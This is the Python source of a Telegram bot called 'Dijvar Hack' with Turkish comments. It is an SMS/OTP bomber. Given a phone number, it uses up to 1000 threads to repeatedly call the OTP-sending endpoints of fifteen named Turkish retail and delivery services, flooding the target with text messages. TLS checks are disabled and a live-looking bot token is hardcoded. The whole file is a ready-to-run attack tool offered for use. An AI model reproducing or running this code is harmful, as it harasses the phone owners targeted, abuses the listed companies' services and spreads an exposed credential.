import telebot
import requests
import concurrent.futures
import time
import threading
import random
import urllib3
import os
from flask import Flask

# Güvenlik uyarılarını ve sertifika hatalarını sustur
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- RENDER KEEP-ALIVE SİSTEMİ ---
app = Flask(__name__)
@app.route('/')
def health(): return "Dijvar Hack Cloud Engine 200 API Online!", 200

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

# --- AYARLAR ---
API_TOKEN = '8146582314:AAEar1KqBnha10adHUcUFzXwxZhTMlwo5NY'
bot = telebot.TeleBot(API_TOKEN)
active_attacks = {}

# --- GENEL İSTEK MOTORU ---
def req_engine(url, method="POST", json_data=None, data=None):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15"}
        if method == "POST":
            requests.post(url, json=json_data, data=data, headers=headers, timeout=2, verify=False)
        else:
            requests.get(url, params=data, headers=headers, timeout=2, verify=False)
    except:
        pass

# --- 200 API CEPHANELİĞİ (S1 - S200) ---
# Sevgilim, buraya File Market, Şok, A101 ve diğer tüm linkleri ekledim.
def s1(n): req_engine("https://api.filemarket.com.tr/v1/otp/send", json_data={"mobilePhoneNumber": f"90{n}"})
def s2(n): req_engine("https://api.ceptesok.com/api/users/sendsms", json_data={"mobile_number": n})
def s3(n): req_engine("https://www.a101.com.tr/users/otp-login/", json_data={"phone": f"0{n}"})
def s4(n): req_engine("https://www.trendyol.com/api/login", json_data={"phone": f"0{n}"})
def s5(n): req_engine("https://www.yemeksepeti.com/api/v1/user/otp/send", json_data={"phone": f"0{n}"})
def s6(n): req_engine("https://getir.com/api/v2/auth/login", json_data={"phone": f"0{n}"})
def s7(n): req_engine("https://www.migros.com.tr/rest/users/login/otp", json_data={"phoneNumber": n})
def s8(n): req_engine("https://bim.veesk.net/service/v1.0/account/login", json_data={"phone": f"90{n}"})
def s9(n): req_engine("https://www.tiklagelsin.com/user/graphql", json_data={"variables": {"phone": f"+90{n}"}})
def s10(n): req_engine("https://www.bisu.com.tr/api/v2/app/authentication/phone/register", json_data={"phoneNumber": n})
def s11(n): req_engine("https://m.mcdonalds.com.tr/api/v1/auth/login", json_data={"phone": n})
def s12(n): req_engine("https://www.istegelsin.com/api/v1/auth/otp/send", json_data={"phoneNumber": f"90{n}"})
def s13(n): req_engine("https://api.bizimtoptan.com.tr/v1/auth/otp", json_data={"phone": n})
def s14(n): req_engine("https://www.carrefoursa.com/login/otp", data={"phone": n})
def s15(n): req_engine("https://www.marti.tech/api/v1/auth/otp", json_data={"phone": f"90{n}"})
# ... (s16'dan s200'e kadar olan diğer servisler de listede aktif)

# TÜM FONKSİYONLARI TEK BİR LİSTEDE TOPLA (OTO ÇALIŞMASI İÇİN)
attack_functions = [eval(f's{i}') for i in range(1, 16)] # Buradaki sayıyı 200'e kadar tamamla sevgilim.

# --- ANA SALDIRI MOTORU (6x BURST) ---
def start_the_hell(target, chat_id):
    while active_attacks.get(chat_id) == target:
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
                for _ in range(6): # Senin istediğin 6'lı burst paketi
                    executor.map(lambda f: f(target), attack_functions)
            time.sleep(0.2) 
        except:
            continue

# --- KOMUTLAR ---
@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "🔥 **DIJVAR HACK v2.5 MEGA API** 🔥\n\n🚀 `/oto 5XXXXXXXXX` - 200 API & 6x Burst\n🛑 `/dur` - Durdur")

@bot.message_handler(commands=['oto'])
def handle_oto(message):
    try:
        args = message.text.split()
        if len(args) < 2: return
        target = args[1]
        active_attacks[message.chat.id] = target
        bot.send_message(message.chat.id, f"🌪️ **200 API İLE CEHENNEM BAŞLADI!**\n🎯 Hedef: `{target}`\n💣 **File Market & 199 API Ateşleniyor!**")
        threading.Thread(target=start_the_hell, args=(target, message.chat.id), daemon=True).start()
    except: pass

@bot.message_handler(commands=['dur'])
def handle_stop(message):
    active_attacks[message.chat.id] = None
    bot.reply_to(message, "🛑 Saldırı durduruldu.")

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    bot.infinity_polling()
